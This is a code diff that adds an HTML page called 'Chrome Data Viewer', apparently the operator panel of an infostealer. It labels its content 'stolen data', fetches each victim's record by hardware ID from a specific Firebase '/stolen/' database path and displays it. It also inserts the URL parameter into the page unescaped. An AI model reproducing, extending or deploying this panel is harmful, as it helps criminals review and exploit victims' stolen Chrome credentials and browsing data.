@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Chrome Data Viewer</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background: #0a0a0a;
+            color: #00ff00;
+            padding: 20px;
+            margin: 0;
+        }
+        h1 { color: #ff0000; text-align: center; }
+        .container { max-width: 1000px; margin: auto; }
+        pre {
+            background: #111;
+            padding: 15px;
+            border: 1px solid #00aa00;
+            overflow: auto;
+            white-space: pre-wrap;
+        }
+        .loading { color: #ffff00; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔥 YOUR CHROME DATA</h1>
+        <p><strong>Hardware ID:</strong> <span id="hwid"></span></p>
+        <div id="status" class="loading">Loading stolen data...</div>
+        <div id="data"></div>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const hwid = urlParams.get('hwid');
+
+        document.getElementById('hwid').textContent = hwid || 'UNKNOWN';
+
+        if (!hwid) {
+            document.getElementById('status').innerHTML =
+                '<span style="color:red">No HWID provided in URL.</span>';
+            document.getElementById('status').classList.remove('loading');
+        } else {
+
+            const firebaseUrl =
+                `https://marhula-41179-default-rtdb.firebaseio.com/stolen/${hwid}.json`;
+
+            console.log("Fetching:", firebaseUrl);
+
+            fetch(firebaseUrl)
+                .then(response => {
+                    if (!response.ok) throw new Error("Not found");
+                    return response.json();
+                })
+                .then(data => {
+                    document.getElementById('status').style.display = 'none';
+                    document.getElementById('data').innerHTML =
+                        `<pre>${JSON.stringify(data, null, 2)}</pre>`;
+                })
+                .catch(err => {
+                    document.getElementById('status').innerHTML = `
+                        <span style="color:red">
+                            Failed to load data for HWID: ${hwid}<br>
+                            ${err.message}
+                        </span>`;
+                    document.getElementById('status').classList.remove('loading');
+                });
+        }
+    </script>
+</body>
+</body>
+</html>
